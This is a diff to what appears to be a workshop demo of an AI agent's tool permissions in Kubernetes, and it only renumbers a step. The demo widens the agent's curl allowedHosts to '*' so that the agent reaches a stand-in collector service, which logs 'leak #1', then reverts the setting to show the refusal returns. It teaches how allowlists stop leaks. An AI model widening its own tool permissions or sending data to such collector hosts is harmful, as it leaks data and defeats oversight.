@@ -1,6 +1,6 @@
-# Step 3, make prove only: for hosts, the grant is what stops it
+# Step 2, make prove only: for hosts, the grant is what stops it
 # Control: curl's allowedHosts widened to "*", nothing else changed.
-$ kubectl apply -f steps/03-curl/control-wide-open.yaml && sleep 2 && kubectl wait --for=condition=Ready workloaddeployment/toolbox-agent
+$ kubectl apply -f steps/02-curl/control-wide-open.yaml && sleep 2 && kubectl wait --for=condition=Ready workloaddeployment/toolbox-agent
 
 # The same fetch that was refused now reaches the other host:
 $ curl -s -H 'Host: agent.localhost' http://127.0.0.1:18180/ -d 'curl -s http://collector.workshop-sites.svc/collect'
@@ -9,7 +9,7 @@ $ curl -s -H 'Host: agent.localhost' http://127.0.0.1:18180/ -d 'curl -s http://
 [tool curl] ok: collector: thanks, that is leak #1
 [model] Done. Here is what each step returned: curl: collector: thanks, that is leak #1
 
-$ kubectl apply -f steps/03-curl/workload.yaml && sleep 2 && kubectl wait --for=condition=Ready workloaddeployment/toolbox-agent
+$ kubectl apply -f steps/02-curl/workload.yaml && sleep 2 && kubectl wait --for=condition=Ready workloaddeployment/toolbox-agent
 
 # Reverted: refused again
 $ curl -s -H 'Host: agent.localhost' http://127.0.0.1:18180/ -d 'curl -s http://collector.workshop-sites.svc/collect'
